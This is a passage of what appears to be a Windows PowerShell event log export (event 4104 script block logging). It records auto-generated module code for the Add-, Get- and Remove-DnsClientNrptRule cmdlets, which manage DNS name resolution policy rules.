[bool]\r\n    ${DnsSecEnable},\r\n\r\n    [Parameter(ParameterSetName='Set3', ValueFromPipelineByPropertyName=$true)]\r\n    [Alias('DnsSecQueryIPsecEncryption')]\r\n    [AllowEmptyString()]\r\n    [AllowNull()]\r\n    [ValidateSet('','None','Low','Medium','High')]\r\n    [string]\r\n    ${DnsSecIPsecEncryptionType},\r\n\r\n    [Parameter(ParameterSetName='Set3', ValueFromPipelineByPropertyName=$true)]\r\n    [Alias('DnsSecQueryIPsecRequired')]\r\n    [System.Nullable[bool]]\r\n    ${DnsSecIPsecRequired},\r\n\r\n    [Parameter(ParameterSetName='Set3', ValueFromPipelineByPropertyName=$true)]\r\n    [System.Nullable[bool]]\r\n    ${DnsSecValidationRequired},\r\n\r\n    [Parameter(ParameterSetName='Set3', ValueFromPipelineByPropertyName=$true)]\r\n    [string]\r\n    ${GpoName},\r\n\r\n    [Parameter(ParameterSetName='Set3', ValueFromPipelineByPropertyName=$true)]\r\n    [Alias('IPsecCARestriction')]\r\n    [string]\r\n    ${IPsecTrustAuthority},\r\n\r\n    [Parameter(ParameterSetName='Set3', Mandatory=$true, Position=1, ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Name},\r\n\r\n    [Parameter(ParameterSetName='Set3', ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateSet('Disable','Utf8WithMapping','Utf8WithoutMapping','Punycode')]\r\n    [string]\r\n    ${NameEncoding},\r\n\r\n    [Parameter(ParameterSetName='Set3', ValueFromPipelineByPropertyName=$true)]\r\n    [string[]]\r\n    ${NameServers},\r\n\r\n    [Parameter(ParameterSetName='Set3', ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${Namespace},\r\n\r\n    [Parameter(ParameterSetName='Set3', ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Server},\r\n\r\n    [Parameter(ParameterSetName='Set3', ValueFromPipelineByPropertyName=$true)]\r\n    [string]\r\n    ${DisplayName},\r\n\r\n    [Parameter(ParameterSetName='Set3')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${PassThru},\r\n\r\n    [Parameter(ParameterSetName='Set3')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Set3')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Set3')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DAEnable')) {\r\n          [object]$__cmdletization_value = ${DAEnable}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DAEnable'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DAEnable'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DAIPsecEncryptionType')) {\r\n          [object]$__cmdletization_value = ${DAIPsecEncryptionType}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DAIPsecEncryptionType'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DAIPsecEncryptionType'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DAIPsecRequired')) {\r\n          [object]$__cmdletization_value = ${DAIPsecRequired}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DAIPsecRequired'; ParameterType = 'System.Nullable`1[[System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DAIPsecRequired'; ParameterType = 'System.Nullable`1[[System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DANameServers')) {\r\n          [object]$__cmdletization_value = ${DANameServers}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DANameServers'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DANameServers'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DAProxyServerName')) {\r\n          [object]$__cmdletization_value = ${DAProxyServerName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DAProxyServerName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DAProxyServerName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DAProxyType')) {\r\n          [object]$__cmdletization_value = ${DAProxyType}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DAProxyType'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DAProxyType'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Comment')) {\r\n          [object]$__cmdletization_value = ${Comment}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Comment'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Comment'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DnsSecEnable')) {\r\n          [object]$__cmdletization_value = ${DnsSecEnable}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DnsSecEnable'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DnsSecEnable'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DnsSecIPsecEncryptionType')) {\r\n          [object]$__cmdletization_value = ${DnsSecIPsecEncryptionType}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DnsSecIPsecEncryptionType'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DnsSecIPsecEncryptionType'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DnsSecIPsecRequired')) {\r\n          [object]$__cmdletization_value = ${DnsSecIPsecRequired}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DnsSecIPsecRequired'; ParameterType = 'System.Nullable`1[[System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.Metho"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4104,
      "details": "odParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DnsSecValidationRequired'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DnsSecValidationRequired'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DAEnable')) {\r\n          [object]$__cmdletization_value = ${DAEnable}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DAEnable'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DAEnable'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('IPsecTrustAuthority')) {\r\n          [object]$__cmdletization_value = ${IPsecTrustAuthority}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPsecTrustAuthority'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPsecTrustAuthority'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Comment')) {\r\n          [object]$__cmdletization_value = ${Comment}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Comment'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Comment'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisplayName')) {\r\n          [object]$__cmdletization_value = ${DisplayName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisplayName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisplayName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('PassThru')) {\r\n          [object]$__cmdletization_value = ${PassThru}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PassThru'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PassThru'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#DnsClientNrptRule'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Add', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_DnsClientNRPTRule_v1.0.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Add-DnsClientNrptRule' -Alias '*'\r\n        \r\n\r\nfunction Get-DnsClientNrptRule\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance[]])][OutputType('Microsoft.Management.Infrastructure.CimInstance#DnsClientNrptRule')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Get1', ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${GpoName},\r\n\r\n    [Parameter(ParameterSetName='Get1', Position=1, ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${Name},\r\n\r\n    [Parameter(ParameterSetName='Get1', ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Server},\r\n\r\n    [Parameter(ParameterSetName='Get1')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Get1')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Get1')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('GpoName')) {\r\n          [object]$__cmdletization_value = ${GpoName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'GpoName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'GpoName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Name')) {\r\n          [object]$__cmdletization_value = ${Name}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Name'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Name'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Server')) {\r\n          [object]$__cmdletization_value = ${Server}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Server'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Server'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#DnsClientNrptRule'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Get', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_DnsClientNRPTRule_v1.0.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-DnsClientNrptRule' -Alias '*'\r\n        \r\n\r\nfunction Remove-DnsClientNrptRule\r\n{\r\n    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#DnsClientNrptRule')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Remove2', ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${GpoName},\r\n\r\n    [Parameter(ParameterSetName='Remove2', Mandatory=$true, Position=1, ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Name},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${PassThru},\r\n\r\n    [Parameter(ParameterSetName='Remove2', ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Server},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${Force},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('GpoName')) {\r\n          [object]$__cmdletization_value = ${GpoName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'GpoName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'GpoName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Name')) {\r\n          [object]$__cmdletization_value = ${Name}\r\n          $__cmdletization_methodParameter = 